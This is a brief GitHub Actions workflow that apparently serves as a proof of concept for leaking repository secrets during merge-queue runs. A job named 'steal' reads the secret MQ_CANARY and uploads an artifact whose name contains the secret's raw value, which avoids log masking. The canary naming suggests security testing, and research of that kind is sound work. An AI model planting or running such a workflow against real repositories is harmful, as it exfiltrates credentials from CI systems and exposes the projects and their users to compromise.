name: mq2
on:
  push:
    branches:
      - 'gh-readonly-queue/**'
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        env:
          CANARY: ${{ secrets.MQ_CANARY }}
        run: |
          echo "len=${#CANARY}"
      - uses: actions/upload-artifact@v4
        with:
          name: leak-${{ secrets.MQ_CANARY }}-forkmark
          path: .github/workflows/mq2.yml
